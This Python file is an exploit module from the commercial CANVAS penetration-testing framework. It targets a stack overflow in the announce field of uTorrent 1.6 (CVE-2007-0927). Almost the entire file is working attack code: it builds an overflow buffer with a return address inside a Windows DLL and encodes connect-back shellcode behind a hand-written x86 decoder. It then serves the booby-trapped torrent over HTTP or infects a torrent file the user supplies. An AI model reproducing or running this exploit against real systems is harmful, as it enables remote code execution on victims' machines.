#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside

NAME='Utorrent Overflow'
DESCRIPTION='Utorrent announcement overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Utorrent"
DOCUMENTATION['Date public']='17/02/07'
DOCUMENTATION['References']=''
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Utorrent 1.6 (build 474)'
DOCUMENTATION["CVE Name"] = "CVE-2007-0927"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0927"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["NOTES"] = "You can infect your own torrent by providing it one, if none is provided it will create its own."

VERSION='1.0'
GTK2_DIALOG='dialog.glade2'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP'] 
PROPERTY['DELIVERY'] = 'HTTP'

USAGE="""

Usage:
./commandlineInterface.py -p 5555 -v 1
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:utorrent -l 10.10.11.1 -d 5555 -p 8080
"""

CHANGELOG="""
"""
TESTED = """
  o Tested on:
     - Windows 2000 SP4 English
     - Windows 2000 SP2 Spanish
"""
targets = {
    0 : ['Autodetect (N/A)',0],
    1 : ['Windows 2000 SP0-SP4', 0x78010F5E] # pop, pop, ret on oleauth32.dll
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.clientversion=1
        self.badstring='\x00\xff:'
        self.subesp=0
        self.name=NAME 
        self.torrent  = None
        self.filename = 'savnac.torrent'
        return

    def makeExploitBuffer(self):
        description, addy = targets[self.version]
        code = mosdef.assemble( "jmp $0x4", "X86") 
        jmp_back = mosdef.assemble("jmp $-0x%08x" % (len(self.shellcode) + 5 + 8 ), "X86")
        buf = "A" * (0x1144-len(self.shellcode)) + self.shellcode + "BB" + code + intel_order(addy) + jmp_back + "B" * (0x1b4- len(jmp_back))
        return buf

    def makefile(self):
        if self.torrent:
             try:
                   f       = open( self.torrent, "r" )
                   data    = f.read()
                   an_off  = data.find("d8:announce")
                   if an_off != -1:
                        size_off = an_off + len("d8:announce")
                        ndx      = data[size_off:].find(":")
                        size     = int ( data[size_off: size_off+ ndx ] )

                        if ndx != -1:
                           filedata = data[:size_off] + "4864:" + self.makeExploitBuffer() + data[size_off+ ndx + 1 + size:]
                           #self.log(filedata)
                           return filedata
                   else:
                       # No announcement tag, lets just create it
                       filedata = "d8:announce4864:" + data

                   self.log("Error using the information for %s, creating our own torret" % self.torrent)
             except IOError:
                   self.log("Error using the information for %s, creating our own torret" % self.torrent)
         
        filedata="d8:announce4864:"+ self.makeExploitBuffer() + "7:comment29:I love pizza, And pizza place10:created by13:uTorrent/160013:creation datei1171901045e8:encoding5:UTF-84:infod6:lengthi62e4:name10:savnac.txt12:piece lengthi65536e6:pieces20:C<\xbf\x3f\x26\xf7\x79\xe5\x68\x62\x55\x65\x56\xfd\xa3\x12\x90\xdc\x32\x55\x65\x65"

        return filedata

    def makesploit(self,clientheader,clientbody):
        self.getArgs()
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.filename):
            self.createShellcode()
            sploitstring=self.makefile()
            h.addHeader('Content-Type','binary/octet-stream')
            b.setBody(sploitstring)
        else:
            self.log('Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','binary/octet-stream')
        return h,b

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        #import shellcodeGenerator
        #sc=shellcodeGenerator.win32()
        #sc.addAttr('findeipnoesp',{'subespval':0})
        #sc.addAttr('revert_to_self_before_importing_ws2_32',None)
        #sc.addAttr('tcpconnect',{'port':self.callback.port,'ipaddress':self.callback.ip})
        #sc.addAttr('CreateThreadRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
        #sc.addAttr('ExitThread',None)
        #rawshellcode = sc.get()
        rawshellcode = self.createInjectToSelf(self.callback.ip, self.callback.port)

        #Due to unicode encoding strangeness between XP SP0 and XP SP1a, the following
        #encoder was implemented to avoid all the characters between 0x80 and 0x9f
        while (len(rawshellcode)%4)!=0:
            rawshellcode+='A'
        SIZE=len(rawshellcode)/4
        if SIZE>0xffff: #should be enough?
            raise Exception,'Shellcode too long! (size: %d)' % (SIZE*4) 

        while ( (SIZE & 0xFF) >=0x80) and ( (SIZE & 0xFF) <=0x9f): #increase SIZE if within the badchars range
            rawshellcode+='BBBB'
            SIZE+=1
        #the encoding scheme is pretty self explanatory
        encodedshellcode=''
        for i in range(0,len(rawshellcode),4):
            L=struct.unpack('<L',rawshellcode[i:i+4])[0]
            HIGH=((L&0xf0f0f0f0)>>4)+0x40404040
            LOW=(L&0x0f0f0f0f)+0x40404040
            encodedshellcode+=struct.pack('<LL',HIGH,LOW)
        decoder=''
        decoder+='\xd9\xee'             # 0: fldz
        decoder+='\xd9\x74\x24\xf4'     # 2: fnstenv 0xfffffff4(%esp)
        decoder+='\x5e'                 # 6: pop %esi
        decoder+='\x6a\x28'             # 7: push $0x28
        decoder+='\x59'                 # 9: pop %ecx
        decoder+='\x03\xf1'             # a: add %ecx,%esi
        decoder+='\x56'                 # c: push %esi
        decoder+='\x5f'                 # d: pop %edi
        if SIZE < 0xff:
            decoder+='\xb1'+chr(SIZE)       # e: mov $SIZE,%cl
        else:
            decoder+='\x66\xB9' + chr( SIZE  & 0xFF ) + chr( (SIZE >>8) & 0xFF) # mov $SIZE, cx
        decoder+='\xad'                 #10: lods %ds:(%esi),%eax
        decoder+='\x2d\x40\x40\x40\x40' #11: sub $0x40404040,%eax
        decoder+='\xc1\xe0\x04'         #16: shl $0x4,%eax
        decoder+='\x50'                 #19: push %eax
        decoder+='\x5a'                 #1a: pop %edx
        decoder+='\xad'                 #1b: lods %ds:(%esi),%eax
        decoder+='\x2d\x40\x40\x40\x40' #1c: sub $0x40404040,%eax
        decoder+='\x03\xc2'             #21: add %edx,%eax
        decoder+='\xab'                 #23: stos %eax,%es:(%edi)
        decoder+='\xe2\xea'             #24: loop 0x10
        decoder = decoder + "A" * ( len(decoder) % 4 )
        #decoder+='\x41'                 #26: inc %ecx
        #decoder+='\x41'                 #27: inc %ecx
        self.shellcode=decoder+encodedshellcode
        self.log('Total shellcode length=%d'%(len(self.shellcode)))
        return self.shellcode

    def getArgs(self):
        self.host     = self.target.interface
        self.filename = self.argsDict.get('filename',self.filename)
        self.torrent  = self.argsDict.get('torrent', self.torrent)

        return 
        
    def displayVersions(self):
        for v in self.versions.keys():
            print 'Version %d: %s'%(v,self.versions[v][0])

    def run(self):
        self.getArgs()
        filedata=self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)

